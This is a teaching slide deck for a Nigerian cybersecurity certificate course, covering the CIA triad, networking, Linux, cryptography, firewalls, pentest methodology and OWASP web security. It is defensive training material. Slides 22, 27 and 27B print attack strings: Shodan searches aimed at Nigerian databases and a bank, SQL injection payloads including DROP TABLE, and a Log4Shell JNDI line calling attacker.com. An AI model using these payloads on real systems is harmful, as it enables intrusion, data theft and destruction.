# Cybersecurity — Professional Slide Deck
## MetaBridge Academy | Course 4 of 4 | 54 Slides

**Design system:** Dark navy background #050B18, electric blue #1A6CFF, cyan #00D4FF, gold #FFB800, red accent #FF4444 (cybersecurity threat colour), white text #FFFFFF
**Font:** Syne (headings), Outfit (body), JetBrains Mono (code/terminal)
**Format:** 16:9 widescreen | All slides include speaker notes

---

## SLIDE 1 — TITLE SLIDE

**Visual:** Full dark navy background. Red terminal cursor blinking in center top. Matrix-style cascading characters in very subtle red at 5% opacity. Center: MetaBridge Academy logo in cyan. Below: shield icon in electric blue.

**Content:**
```
METABRIDGE ACADEMY

CYBERSECURITY
Professional Certificate Programme

Think Like an Attacker. Defend Like a Professional.

━━━━━━━━━━━━━━━━━━━━

12 Modules · Kali Linux · TryHackMe · Burp Suite · Wireshark
Blockchain-Verified Certificate
metabridgeacademy.com
```

**Speaker notes:** The red cursor sets the tone — this is a technical, intense course. Use the opening ATM story before showing this slide.

---

## SLIDE 2 — THE NIGERIAN CYBER THREAT REALITY

**Visual:** Map of Nigeria with red threat vectors radiating outward and inward. Key statistics displayed as large bold numbers. Dark red background tint on this slide only.

**Content:**
```
NIGERIA'S CYBERSECURITY REALITY

$500M+       Annual losses to cybercrime (EFCC)
37,000+      Banking fraud cases per year (NIBSS)
44%          Increase in BEC fraud targeting Nigerian businesses (2023)
197 days     Average time to detect a breach globally (IBM)

WHAT NIGERIANS FACE:
→ SIM swap fraud — a growing epidemic
→ Smishing (fake bank SMS) — millions sent daily
→ BEC fraud — Nigerian groups operate globally
→ Ransomware — targeting hospitals, schools, businesses

YOU ARE THE SOLUTION.
MetaBridge-trained cybersecurity professionals.
```

**Speaker notes:** These statistics ground the course in reality. Students need to understand they're entering a profession with genuine demand and genuine stakes.

---

## SLIDE 3 — COURSE OVERVIEW

**Visual:** 12-module grid, colour-coded by phase. Foundation modules tinted blue, Technical modules cyan, Advanced modules gold, Capstone red.

**Content:**
```
YOUR 12-MODULE SECURITY JOURNEY

FOUNDATION (Modules 1–4)          TECHNICAL SKILLS (Modules 5–7)
1. Introduction & CIA Triad        5. Network Security
2. Networking for Security         6. Ethical Hacking & Pentest
3. Linux & Command Line            7. Web App Security (OWASP)
4. Cryptography & PKI              

HUMAN & MALWARE (Modules 8–9)     ADVANCED (Modules 10–12)
8. Social Engineering              10. Incident Response & Forensics
9. Malware Analysis                11. Cloud Security
                                   12. GRC & Future of Security

                    + CAPSTONE PROJECT

Lab Platforms: ANY.RUN · VirusTotal · Wireshark · Nmap ·
               Burp Suite · Shodan · TryHackMe · Metasploit ·
               OWASP ZAP · Kali Linux · Have I Been Pwned · CyberChef
```

**Speaker notes:** Cover the full roadmap. The lab platforms are a differentiator — name them all. Students should feel they're getting access to the same tools as professionals.

---

## SLIDE 3B — DIFFICULTY LEVEL OVERVIEW

**Visual:** Four horizontal bands stacked vertically, each in a distinct colour: blue (Beginner), cyan (Intermediate), gold (Advanced), red/white (Professional). Each band shows module numbers and a brief descriptor. Progress arrow pointing upward on the right side.

**Content:**
```
YOUR LEARNING JOURNEY — 4 LEVELS OF MASTERY

BEGINNER        M1–M3    Cybersecurity foundations · Networking for security · Linux & command line
INTERMEDIATE    M4–M6    Cryptography & PKI · Network security · Ethical hacking methodology
ADVANCED        M7–M9    Web app security (OWASP) · Social engineering · Malware analysis
PROFESSIONAL   M10–M12   Incident response & forensics · Cloud security · GRC & compliance

Complete each level before advancing to the next.
```

**Speaker notes:** This map shows students the full arc of the course. By the end of the Beginner level, they can think like a defender. By Intermediate, they can think like an attacker. Advanced adds real-world attack and malware analysis. Professional prepares them for enterprise roles with governance and forensics responsibilities.

---

## SLIDE 4 — MODULE 1 OPENER: INTRODUCTION TO CYBERSECURITY

**Visual:** Large "01" ghost number in red. Three shield icons representing the CIA Triad. Binary code watermark in background.

**Content:**
```
LEVEL: BEGINNER

MODULE 01

INTRODUCTION TO
CYBERSECURITY

Foundations · CIA Triad · Threat actors
Nigerian cyber landscape · Hacker ethics
Cybercrimes Act 2015 · Career paths
```

**Speaker notes:** Open with the ATM story before this slide. The story sets the tone: social engineering is the most common attack vector. Technology is not always the attacker's tool.

---

## SLIDE 5 — THE CIA TRIAD

**Visual:** Equilateral triangle with three glowing vertices: CONFIDENTIALITY (blue), INTEGRITY (cyan), AVAILABILITY (gold). The triangle center shows "BALANCED SECURITY." Arrows around the outside show the tension between each pair.

**Content:**
```
THE CIA TRIAD — THE FOUNDATION OF ALL SECURITY

CONFIDENTIALITY               INTEGRITY
"Only authorised people       "Information is accurate
 can access this"              and hasn't been tampered with"

 Example:                      Example:
 Encrypted customer data       SHA-256 hash verification
 Role-based access control     Digital signatures

            AVAILABILITY
         "Systems are accessible
          when legitimate users need them"
          
          Example:
          Server redundancy, DDoS protection

THE CONSTANT TENSION:
Maximum confidentiality ↔ Maximum availability
Your job: find the right balance for the risk context
```

**Speaker notes:** The tension is the teaching moment. Ask students to identify where they'd place a hospital's patient records system on the triad. Then a military communications system. Then a public news website. Same principles, different balance points.

---

## SLIDE 5B — CIA TRIAD: CONTROLS & TOOLS

**Visual:** Three-column layout, one column per CIA pillar with matching colour scheme (blue/cyan/gold). Each column is a card with the pillar name at the top and bulleted tools below. Minimalist — icon-driven.

**Content:**
```
HOW WE PROTECT EACH PILLAR

┌─────────────────────┬──────────────────────┬─────────────────────┐
│  CONFIDENTIALITY    │      INTEGRITY       │    AVAILABILITY     │
│  ─────────────────  │  ──────────────────  │  ─────────────────  │
│                     │                      │                     │
│  🔒 ENCRYPTION      │  #  HASHING          │  🔁 REDUNDANCY      │
│  AES-256 (at rest)  │  SHA-256 / SHA-3     │  RAID, Clustering   │
│  TLS 1.3 (transit)  │                      │  Geographic         │
│                     │  ✍  DIGITAL SIGS     │                     │
│  👤 ACCESS CONTROL  │  RSA-PSS / ECDSA     │  ⚖  LOAD BALANCING │
│  RBAC / DAC / MAC   │                      │  HAProxy, AWS ELB   │
│  Least Privilege    │  ✓  CHECKSUMS        │  NGINX              │
│                     │  CRC32 / Adler-32    │                     │
│  🔑 MFA             │                      │  🚨 DDoS MITIGATION │
│  TOTP (Authenticator│  📋 VERSION CONTROL  │  Cloudflare         │
│  YubiKey / Hardware │  Git + Signed Commits│  AWS Shield         │
│  Biometrics         │                      │  Akamai             │
│                     │  🗄  WORM STORAGE    │                     │
│  🏷  DATA CLASS.    │  S3 Object Lock      │  💾 BACKUPS         │
│  Public→Restricted  │  Immutable Logs      │  3-2-1 Rule         │
│                     │                      │  Air-gapped copies  │
│                     │                      │                     │
│                     │                      │  📋 DISASTER REC.   │
│                     │                      │  Hot/Warm/Cold Site │
│                     │                      │  RTO · RPO · BCP    │
└─────────────────────┴──────────────────────┴─────────────────────┘
```

**Speaker notes:** This slide is the reference map. Every tool you teach in this course lives in one of these three columns. When students ask 'why are we learning X?' — point them here. SHA-256? Integrity. TLS? Confidentiality. Cloudflare? Availability. Return to this slide at the end of Module 1 and again at the end of the course.

---

## SLIDE 6 — THREAT ACTORS

**Visual:** Six cards arranged in a 2×3 grid. Each card has a dark background with a different icon and colour representing each threat actor type. Motivation and typical attack listed on each card.

**Content:**
```
WHO IS ATTACKING?

[CYBERCRIMINAL]          [NATION-STATE]           [HACKTIVIST]
Financial gain           Espionage, sabotage       Political/ideological
BEC, ransomware          APT, infrastructure       DDoS, defacement
card fraud               attacks                   data leaks

[INSIDER THREAT]         [SCRIPT KIDDIE]           [COMPETITOR]
Grudge, greed            Fame, curiosity            Corporate espionage
Data theft               Uses existing tools        IP theft
account abuse            Copies attacks             data exfiltration

NIGERIAN CONTEXT:
SilverTerrier group — world-class BEC operators
SIM swap fraud rings — organised criminal groups
Growing nation-state targeting of Nigerian infrastructure
```

**Speaker notes:** The SilverTerrier reference is important. Nigeria is mentioned in international threat intelligence as the origin of sophisticated BEC operations. Acknowledging this honestly is part of building a counterforce.

---

## SLIDE 7 — HACKER ETHICS

**Visual:** Three hats in a row — white (glowing blue), grey (middle), black (dark/ominous). Below each hat: definition and legal status.

**Content:**
```
THE THREE HATS

WHITE HAT              GREY HAT               BLACK HAT
─────────────          ──────────             ──────────
Authorised testing     No authorisation       Malicious
                       Usually discloses      Criminal

Penetration tester     "I found a bug         Attacker
Bug bounty hunter      and told them"         Data thief
Security consultant                           Ransomware operator

Legal ✓                Legal grey area ⚠      Illegal ✗

NIGERIA: Cybercrimes Act 2015
Section 6: Unauthorised access → up to 3 years imprisonment
Section 14: Identity theft → up to 7 years
Section 19: Computer fraud → up to 7 years

WE TRAIN WHITE HATS ONLY.
Everything requires written authorisation. No exceptions.
```

**Speaker notes:** This slide cannot be rushed. State clearly: every technique taught in this course requires authorisation before use. The legal consequences are real and have been applied in Nigeria.

---

## SLIDE 8 — CYBERSECURITY CAREERS

**Visual:** Career ladder with salary bands shown as horizontal bars. Remote work opportunity highlighted in gold at top of ladder.

**Content:**
```
CYBERSECURITY CAREER MAP — NIGERIA 2024/25

SOC Analyst (Tier 1)      ₦150K–₦300K/month    Entry point
Security Analyst           ₦300K–₦600K/month    +2 years
Penetration Tester         ₦400K–₦900K/month    +CEH/OSCP
Incident Responder         ₦500K–₦1M/month      High demand now
Security Engineer          ₦600K–₦1.5M/month    Technical expert
CISO                       ₦1.5M–₦5M/month      Executive level

🌍 REMOTE/INTERNATIONAL: $2,000–$8,000/month

CERTIFICATIONS THAT OPEN DOORS:
CompTIA Security+ → CySA+ → CEH → OSCP

Your MetaBridge blockchain certificate:
Verifiable by any employer, instantly, globally.
```

**Speaker notes:** These are real market rates. The OSCP certification (Offensive Security Certified Professional) is the most respected penetration testing certification globally. It's difficult — a 24-hour practical exam. Worth pursuing after this programme.

---

## SLIDE 9 — MODULE 2 OPENER: NETWORKING

**Visual:** Network diagram with nodes, switches, routers — animated to show packet flow. OSI layer stack on right side.

**Content:**
```
LEVEL: BEGINNER

MODULE 02

NETWORKING
FUNDAMENTALS FOR SECURITY

"You cannot defend what you don't understand.
 Networks are the terrain of every cyberattack."

OSI 7 layers · TCP/IP · IP addressing
DNS · DHCP · HTTP/HTTPS · Common ports
Wireshark packet analysis · Nmap scanning
```

**Speaker notes:** Networking is not optional background. It is the foundation of understanding every attack. If a student says "I don't need to know networking," the response is: "Tell me how to defend a network you don't understand."

---

## SLIDE 10 — THE OSI MODEL — SECURITY LENS

**Visual:** Seven-layer stack diagram. Each layer is a different shade from dark to light. On the right side: attack types mapped to each layer with small warning icons.

**Content:**
```
OSI MODEL — 7 ATTACK SURFACES

Layer 7  APPLICATION    HTTP, SMTP, DNS         SQL injection, XSS, phishing
Layer 6  PRESENTATION   Encryption, format      SSL stripping, weak ciphers
Layer 5  SESSION        Session management      Session hijacking, replay
Layer 4  TRANSPORT      TCP/UDP, ports          SYN flood, port scanning
Layer 3  NETWORK        IP addressing           IP spoofing, routing attacks
Layer 2  DATA LINK      MAC, Ethernet, WiFi     ARP spoofing, MAC flooding
Layer 1  PHYSICAL       Cables, wireless        Physical access, evil twin AP

MEMORY AID: "All People Seem To Need Data Processing"

Most attacks happen at Layer 7 (Application)
Most defenders focus on Layer 3 (Network) only
The gap = where attackers thrive
```

**Speaker notes:** The last three lines are the key insight. Traditional corporate security focuses on network-layer firewalls. Modern attackers live at the application layer. This mismatch is why breaches happen through "secured" networks.

---

## SLIDE 11 — TCP HANDSHAKE & SYN FLOOD

**Visual:** Three-step handshake diagram on left (normal). SYN flood attack diagram on right showing hundreds of SYN arrows with no ACK responses, overwhelming the server.

**Content:**
```
TCP THREE-WAY HANDSHAKE

NORMAL:                         ATTACK (SYN FLOOD):
Client → Server: SYN            Attacker → Server: SYN × 10,000
Server → Client: SYN-ACK        Server → Attacker: SYN-ACK × 10,000
Client → Server: ACK            Attacker: (never sends ACK)
Connection established!         
                                 Server holds 10,000 half-open connections
                                 Memory exhausted → Server crashes
                                 = DoS attack at Transport Layer

MITIGATION:
• SYN cookies — server doesn't commit resources until full handshake
• Rate limiting — block excessive SYN from single IP
• DDoS protection service (Cloudflare, AWS Shield)
```

**Speaker notes:** This is one of those concepts where the diagram immediately makes sense. Draw the SYN flood on the board — show the server drowning in half-open connections.

---

## SLIDE 12 — KEY PORTS — SECURITY RELEVANCE

**Visual:** Table with ports, protocols, and threat colour coding. Red for "dangerous/avoid," yellow for "secure but monitor," green for "secure standard."

**Content:**
```
PORTS EVERY SECURITY PROFESSIONAL MUST KNOW

PORT    PROTOCOL    SECURITY NOTE
─────────────────────────────────────────────────────
21      FTP         🔴 Plaintext file transfer — avoid entirely
22      SSH         🟢 Encrypted remote access — monitor for brute force
23      TELNET      🔴 NEVER use — sends everything in plaintext
25/587  SMTP        🟡 Email — check for open relays, monitor
53      DNS         🟡 Monitor for DNS tunnelling (data exfiltration)
80      HTTP        🟡 Redirect to HTTPS — no sensitive data over HTTP
443     HTTPS       🟢 Encrypted web — verify valid certificates
445     SMB         🔴 HIGH RISK — EternalBlue/WannaCry exploited this
3306    MySQL       🔴 Should NEVER be open to internet
3389    RDP         🔴 Remote Desktop — heavily brute-forced
8080    HTTP Alt    🟡 Often development/proxy — check if intentional
```

**Speaker notes:** Have students pull out their phones and check if they're using any HTTP websites for sensitive activities (banking, email). Look at the lock icon. No lock = no protection.

---

## SLIDE 13 — MODULE 3 OPENER: LINUX

**Visual:** Dark terminal window with command line prompt. Commands typing across the screen in real time (animated). Kali Linux dragon logo subtle in background.

**Content:**
```
LEVEL: BEGINNER

MODULE 03

LINUX & COMMAND LINE
FOR SECURITY

"96% of the world's servers run Linux.
 100% of the world's best security tools run on Linux."

Navigation · File operations · Permissions
User management · Log analysis · Bash scripting
Kali Linux — the security professional's OS
```

**Speaker notes:** Students who have never used a command line often feel anxious. Reassure them: Linux commands are logical and consistent. Within 2 sessions they'll feel fluent in the basics.

---

## SLIDE 14 — ESSENTIAL LINUX COMMANDS

**Visual:** Terminal-style dark card with three columns of commands in JetBrains Mono. Categories: Navigate, Search, Network. Each command has a brief inline comment.

**Content:**
```
ESSENTIAL SECURITY COMMANDS

NAVIGATION & FILES            SEARCHING                NETWORK
────────────────              ─────────────            ──────────
pwd  # Where am I?            grep "Failed" auth.log   ip addr
ls -la  # All files           grep -r "pass" /etc/     ss -tlnp  # Ports
cat /etc/passwd               find / -name "*.sh"      ping 8.8.8.8
tail -f /var/log/auth.log     find / -perm -4000       traceroute site.com
chmod 600 private.key         strings binary | grep IP  curl -I https://site
chown root:root file          awk '{print $1}' | sort   wget https://url/file

LOG ANALYSIS SUPERPOWERS:
# Find all failed SSH logins:
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# Who logged in successfully:
grep "Accepted" /var/log/auth.log

# What did sudo users do:
grep "sudo:" /var/log/auth.log
```

**Speaker notes:** Print this as a reference card. Students should have it in front of them during every Linux lab. After 10 hours of practice, they won't need it — it will be instinct.

---

## SLIDE 15 — FILE PERMISSIONS — VISUALISED

**Visual:** Large permission string breakdown: `-rwxr-xr--`. Each section is colour-coded and labelled with arrows explaining each component. Below: chmod octal table.

**Content:**
```
LINUX FILE PERMISSIONS

-rwxr-xr--
│││└┬┘└┬┘└┬┘
│││ │   │  └── OTHERS: r-- = read only (4)
│││ │   └───── GROUP:  r-x = read + execute (5)
│││ └───────── OWNER:  rwx = read + write + execute (7)
││└─────────── Type: - = file, d = directory

OCTAL:  r=4  w=2  x=1

SECURITY RULES:
chmod 777  NEVER — world-writable is dangerous
chmod 755  Web scripts and executables (rwxr-xr-x)
chmod 644  Web-accessible files (rw-r--r--)
chmod 600  Private keys, secrets (rw-------)
chmod 640  Config files (rw-r-----)

AUDIT COMMANDS:
find / -perm -o+w  # World-writable files = risk
find / -perm -4000  # SUID files = privilege escalation risk
```

**Speaker notes:** The 777 rule is non-negotiable. Any file or directory with 777 permissions should be investigated — it means anyone on the system can modify it. This is a common misconfiguration left by developers.

---

## SLIDE 16 — MODULE 4 OPENER: CRYPTOGRAPHY

**Visual:** Mathematical symbols floating in space — modular arithmetic, key icons, lock icons, binary sequences. Elegant and mysterious.

**Content:**
```
LEVEL: INTERMEDIATE

MODULE 04

CRYPTOGRAPHY
& PKI

"The mathematics that protects
 every secure transaction you make."

Symmetric vs Asymmetric · AES · RSA
Hashing (SHA-256 / bcrypt) · Digital signatures
TLS handshake · Public Key Infrastructure
Certificate Authorities · CyberChef labs
```

**Speaker notes:** Cryptography intimidates students. Start by telling them: you don't need to understand the math. You need to understand what it does, when to use it, and what breaks it. The math is the computer's job.

---

## SLIDE 17 — SYMMETRIC VS ASYMMETRIC ENCRYPTION

**Visual:** Two-panel comparison. Left (Symmetric): single key icon, two people sharing it, question mark between them ("How?"). Right (Asymmetric): two key icons (public: gold, private: red), secure exchange shown with arrows.

**Content:**
```
TWO TYPES OF ENCRYPTION

SYMMETRIC                         ASYMMETRIC
─────────────────────             ─────────────────────
Same key: encrypt AND decrypt     Public key: encrypt / verify
                                  Private key: decrypt / sign

Fast (AES-256 = very fast)        Slow (RSA = computationally expensive)
Great for large data              Great for key exchange, signatures

The Problem:                      The Solution:
How do you share the key          What the public key encrypts,
securely?                         ONLY the private key decrypts

REAL-WORLD USE:
HTTPS = Asymmetric to exchange a key → Symmetric for all data
→ Best of both worlds: security of asymmetric + speed of symmetric

Nigerian example:
WhatsApp E2E = your recipient's public key encrypts every message
Only their private key (on their phone) can decrypt it
```

**Speaker notes:** The hybrid approach is the key insight. No real-world system uses only asymmetric encryption for data — it's too slow. They use it to establish a shared key, then switch to AES.

---

## SLIDE 18 — HASHING — THE SECURITY WORKHORSE

**Visual:** Input funnel → hash box → fixed-length output. Three inputs shown of different lengths, all producing same-length outputs. Avalanche effect demonstrated: "hello" vs "Hello" → completely different hashes.

**Content:**
```
CRYPTOGRAPHIC HASHING

ANY INPUT → [SHA-256] → ALWAYS 64 CHARACTERS

"hello"   → 2cf24dba5fb0a30e26e83b2ac5b9e29e...
"Hello"   → 185f8db32921bd46d35f6a1d23e7e7d6...
          ↑ ONE CAPITAL LETTER — COMPLETELY DIFFERENT HASH

Properties:
ONE-WAY       Cannot reverse the hash to find the input
DETERMINISTIC  Same input → always same hash
AVALANCHE     Tiny input change → completely different hash
COLLISION-FREE Virtually impossible to find two inputs with same hash

SECURITY APPLICATIONS:
Passwords     Store the HASH, never the password
File integrity Hash before and after — any change is detected
Blockchain    Each block's hash includes previous block's hash
Digital sig   Hash the document, sign the hash

STATUS:
MD5     🔴 BROKEN — collisions found 2004
SHA-1   🔴 BROKEN — deprecated 2017
SHA-256 🟢 SECURE — current standard
bcrypt  🟢 BEST for passwords — slow by design
```

**Speaker notes:** The "slow by design" point for bcrypt is crucial. bcrypt is intentionally slow to compute — 100ms instead of microseconds. For a legitimate user, unnoticeable. For an attacker trying millions of passwords — makes brute force take millennia.

---

## SLIDE 19 — TLS HANDSHAKE

**Visual:** Step-by-step sequence diagram with browser on left, server on right. Each step is a numbered arrow with label. The "session key" appears in the middle after step 4, glowing cyan — representing the secure channel established.

**Content:**
```
HOW HTTPS WORKS — THE TLS HANDSHAKE

BROWSER                                    SERVER
  │ ──── 1. Client Hello ────────────────→ │
  │      "I support TLS 1.3, here are      │
  │       my cipher suites"                │
  │                                        │
  │ ←─── 2. Server Hello + Certificate ─── │
  │      "Here's my cert, here's my        │
  │       public key"                      │
  │                                        │
  │  3. Browser verifies certificate:      │
  │     ✓ Signed by trusted CA?            │
  │     ✓ Domain matches?                  │
  │     ✓ Not expired?                     │
  │                                        │
  │ ──── 4. Key Exchange ────────────────→ │
  │ ←─── 4. Key Exchange ─────────────── │
  │      Both derive the SAME session key  │
  │       without sending it over the wire │
  │                                        │
  │ ══════ 5. AES-256 ENCRYPTED DATA ════ │

Certificate is what makes the padlock. Certificate Chain = Root CA → You.
```

**Speaker notes:** The magic is step 4. Both sides derive the same key without ever sending it over the network. This is Diffie-Hellman key exchange. Anyone watching sees the exchange but cannot determine the shared secret from what they observed.

---

## SLIDE 20 — MODULE 5 OPENER: NETWORK SECURITY

**Visual:** Firewall icon prominent, with traffic arrows on left (red for blocked, green for allowed) and clean network on right. Shield motif.

**Content:**
```
LEVEL: INTERMEDIATE

MODULE 05

NETWORK SECURITY

"The firewall is not security. It's one layer
 of a defence-in-depth strategy."

Firewall types & iptables · IDS vs IPS
VPN implementation · Wireless security (WPA2/WPA3)
ARP spoofing · DNS poisoning
Shodan reconnaissance · Nmap mastery
```

**Speaker notes:** The "not just a firewall" message is important for students who come in thinking firewalls = security. The lesson: firewalls are layer 3/4 controls. Most attacks now happen at layer 7 (application). You need multiple layers.

---

## SLIDE 21 — FIREWALL RULES

**Visual:** Network diagram showing three zones: Internet (red), DMZ (yellow), Internal (green). Firewall icons at each boundary with rule arrows. iptables command snippet at bottom.

**Content:**
```
FIREWALL ARCHITECTURE — DEFENCE IN DEPTH

INTERNET          │  DMZ (Demilitarised Zone)  │  INTERNAL NETWORK
─────────────     │  ─────────────────────────  │  ──────────────────
All traffic       │  Web server: 80, 443        │  Database: 3306
                  │  Mail server: 25, 587        │  Internal apps
         ↓        │  DNS server: 53              │  Workstations
    FIREWALL 1    │                     ↓        │
    Allow 80,443  │              FIREWALL 2      │
    Allow 25,587  │              Allow only      │
    Block all     │              specific DB      │
    else          │              connections      │

# UFW Example:
ufw allow 22/tcp              # SSH from admin only
ufw allow 443/tcp             # HTTPS from anywhere
ufw deny 3306                 # MySQL NEVER public
ufw deny 23/tcp               # Telnet blocked
ufw default deny incoming     # Default deny all inbound
```

**Speaker notes:** The DMZ concept is what most students haven't seen before. Draw this three-zone model on the board. "If the web server gets hacked — and it probably will eventually — the attacker is still in the DMZ, not in your database."

---

## SLIDE 22 — SHODAN — THE SECURITY PROFESSIONAL'S SEARCH ENGINE

**Visual:** Shodan interface screenshot (generic representation). Search results showing exposed devices. Red warning icons on exposed items.

**Content:**
```
SHODAN — "THE INTERNET'S MOST DANGEROUS SEARCH ENGINE"

What it finds: internet-facing devices, open ports, banners, service versions

ATTACKER SEARCHES:
country:NG port:3306          # Nigerian MySQL databases open to internet
country:NG port:3389          # RDP servers in Nigeria
country:NG "default password" # Devices still using default credentials
org:"GTBank"                  # Services belonging to GTBank's IP range

WHAT'S BEEN FOUND (documented cases):
• MongoDB databases in Nigeria with no authentication
• IP cameras with default credentials (admin/admin)
• Old WordPress sites exposing /wp-admin to internet
• Database connection strings in indexed error pages

DEFENDER USE:
Search YOUR organisation's IP range on Shodan.
If Shodan can see it — so can every attacker in the world.
Anything visible but unintended = immediate security action required.
```

**Speaker notes:** This is the slide that creates the most silence in the room. Students realise that "securing" their systems while leaving them exposed on Shodan is not security at all. Run a Shodan search live if possible — show real (not staged) results.

---

## SLIDE 23 — MODULE 6 OPENER: ETHICAL HACKING

**Visual:** A penetration tester's workspace: terminal with code, sticky notes with IP addresses and findings, coffee mug. Professional and methodical, not dangerous-looking.

**Content:**
```
LEVEL: INTERMEDIATE

MODULE 06

ETHICAL HACKING &
PENETRATION TESTING

"Authorised. Documented. Professional."

PTES methodology · Pre-engagement requirements
Intelligence gathering (OSINT) · Vulnerability analysis
Exploitation · Post-exploitation · Reporting
Legal framework in Nigeria
```

**Speaker notes:** Set the tone immediately: this is professional work, not "hacking for fun." Penetration testing is billable, structured, documented, and legally protected — but ONLY with written authorisation.

---

## SLIDE 24 — THE PENTEST LIFECYCLE (PTES)

**Visual:** Seven-phase circular flow diagram. Each phase is a segment of the circle, labelled and coloured. Phase 1 (Pre-Engagement) is the largest — emphasising its importance.

**Content:**
```
PENETRATION TESTING EXECUTION STANDARD (PTES)

1. PRE-ENGAGEMENT (LARGEST PHASE — don't skip)
   Signed agreement · Scope definition · Rules of Engagement
   Emergency contacts · Legal authorisation — ALL BEFORE TOUCHING ANYTHING

2. INTELLIGENCE GATHERING
   OSINT · WHOIS · Google Dorking · Shodan · Subdomains · Social media

3. THREAT MODELLING
   What's most valuable? What's most likely targeted? Priority targets?

4. VULNERABILITY ANALYSIS
   Automated scanners + manual testing + CVE research

5. EXPLOITATION
   Attempt to exploit findings — within scope, document everything

6. POST-EXPLOITATION
   What data is accessible? Lateral movement? Privilege escalation?

7. REPORTING
   Executive summary + Technical findings + Remediation roadmap

WITHOUT PHASE 1 PAPERWORK → PHASES 2–7 ARE CRIMINAL.
```

**Speaker notes:** Spend time on Phase 1. Students want to jump to Phase 5 (exploitation). Force them to understand: a penetration test without proper documentation and authorisation is simply a cyberattack. The paper is what makes it legal.

---

## SLIDE 25 — MODULE 7 OPENER: WEB APP SECURITY

**Visual:** Browser window with warning symbols. OWASP Top 10 list showing in the background. Injection syringe icon and XSS code symbol prominent.

**Content:**
```
LEVEL: ADVANCED

MODULE 07

WEB APPLICATION
SECURITY

"80% of cyberattacks target web applications.
 This is where most of the action is."

OWASP Top 10 (2021) · SQL injection (live demo)
Cross-Site Scripting (XSS) · Broken access control
Burp Suite mastery · Security headers
Web application firewalls · OWASP ZAP
```

**Speaker notes:** The 80% statistic gets attention. Most students think attacks happen at the network level. Most attacks happen at the application level — in code that developers wrote.

---

## SLIDE 26 — OWASP TOP 10 (2021)

**Visual:** 10-item ranked list. Each item has: rank, name, icon, and one-line description. A01 is highlighted in red (most critical). Items are stacked vertically with severity bars on the right.

**Content:**
```
OWASP TOP 10 — MOST CRITICAL WEB VULNERABILITIES

A01 Broken Access Control        User can act beyond intended permissions
A02 Cryptographic Failures       Sensitive data exposed due to weak/missing encryption
A03 Injection                    SQL/Command/LDAP injection — untrusted data as commands
A04 Insecure Design             Security risks from design flaws, not bugs
A05 Security Misconfiguration   Default credentials, open storage, debug mode on
A06 Vulnerable Components       Outdated libraries with known CVEs
A07 Auth Failures               Weak passwords, no MFA, bad session management
A08 Software Integrity Failures  Unverified updates, supply chain attacks
A09 Logging & Monitoring Gaps   Can't detect breaches you don't log
A10 SSRF                        Server tricked into making requests attacker controls

Source: OWASP Foundation (owasp.org)
Updated: 2021 | Next update expected: 2025
```

**Speaker notes:** A01 being #1 (Broken Access Control) is the key insight — it moved up from #5. Access control failures are everywhere, in every application. Students will test for this first in every web application assessment.

---

## SLIDE 27 — SQL INJECTION — LIVE DEMO SLIDE

**Visual:** Code block showing vulnerable PHP/SQL code on left. Arrow pointing to attacker's input. Result on right showing the broken query with the comment injection visible.

**Content:**
```
SQL INJECTION — THE MOST DANGEROUS WEB VULNERABILITY

VULNERABLE CODE:
$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'
          AND password='" . $_POST['password'] . "'";

ATTACKER ENTERS: username = admin'--

RESULTING QUERY:
SELECT * FROM users WHERE username='admin'--' AND password='anything'
                                              ↑
                                   -- comments out everything after
                                   Password check is gone. Logged in as admin.

WORSE:
username = '; DROP TABLE users;--    ← Deletes the entire users table
username = ' UNION SELECT * FROM admin_accounts--  ← Extracts admin data

THE FIX (Parameterised Queries):
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);  // User input is data, never code
```

**Speaker notes:** Live demo here. Open WebGoat or DVWA and actually exploit it. Let students see the admin dashboard appear after typing `admin'--`. The visual impact of breaking a real (lab) application is unforgettable.

---

## SLIDE 27B — LOG4SHELL: A06 IN PRACTICE

**Visual:** World map with glowing red dots spreading rapidly from left to right, representing exploit attempts. Timeline bar showing: "Dec 9 — Disclosed → Dec 10 — 10K exploits/hr → Dec 11 — 800K exploits/hr." Bottom stat badge in red: "CVSS 10.0 — MAXIMUM SEVERITY."

**Content:**
```
LOG4SHELL (CVE-2021-44228)
OWASP A06 — The Most Critical Vulnerability of the Decade

THE VULNERABLE CODE:
Apache Log4j — a Java logging library in BILLIONS of applications
Amazon · Apple iCloud · Microsoft · Google · Tesla · Cloudflare

THE EXPLOIT (just type this into a search box or username field):
${jndi:ldap://attacker.com/exploit}

Log4j sees it → fetches the attacker's server → executes their code
→ Full Remote Code Execution. Zero authentication required.

THE IMPACT:
✗ 800,000 exploitation attempts per HOUR within 72 hours
✗ Nation-states, ransomware gangs, script kiddies — all using same exploit
✗ Every unpatched Java application exposed globally

THE LESSON (A06):
Nobody WROTE this code — they INCLUDED it as a dependency.
One line: log4j:log4j:2.14.1

REMEDIATION: Upgrade to Log4j 2.17.1+
PREVENTION: Software Composition Analysis (SCA) scanning — scan ALL
your dependencies for known CVEs before deployment.

Tools: Snyk · Dependabot · OWASP Dependency-Check
```

**Speaker notes:** "Who installed Log4j? The answer is: developers, by adding one line to a build file. You are responsible for the security of every line of code your application runs — including the code you didn't write. SCA tools are now a mandatory part of any professional development pipeline."

---

## SLIDE 28 — MODULE 8 OPENER: SOCIAL ENGINEERING

**Visual:** Email inbox showing a realistic phishing email. Red warning overlays identifying the manipulation elements: fake sender, urgency, suspicious link, fear trigger.

**Content:**
```
LEVEL: ADVANCED

MODULE 08

SOCIAL ENGINEERING &
PHISHING

"The strongest firewall in the world
 cannot stop a human who is deceived."

The psychology of manipulation
Phishing · Spear phishing · BEC
Vishing · Smishing · Pretexting
SIM swap fraud · Security awareness training
Email authentication (SPF/DKIM/DMARC)
```

**Speaker notes:** Before the slide, tell students: "I'm going to teach you how attackers manipulate people. This is so you can recognise it, defend against it, and train others to defend against it. NOT so you can use it."

---

## SLIDE 29 — THE 6 PSYCHOLOGICAL LEVERS

**Visual:** Six hexagonal tiles in a honeycomb pattern, each representing one Cialdini principle. Different colours for each. Brief example of each in cybercrime context.

**Content:**
```
SOCIAL ENGINEERING PSYCHOLOGY (Cialdini's 6 Principles)

AUTHORITY            URGENCY              SOCIAL PROOF
"This is your CEO"   "Within 24 hours"    "Your colleague Emeka
"EFCC investigation" "Account suspended"   already approved this"
"Bank fraud dept"    Disables thinking    We follow the crowd

RECIPROCITY          LIKING               COMMITMENT
"I helped you        Build rapport        "You said you'd help"
 last week"          before the ask       We follow through
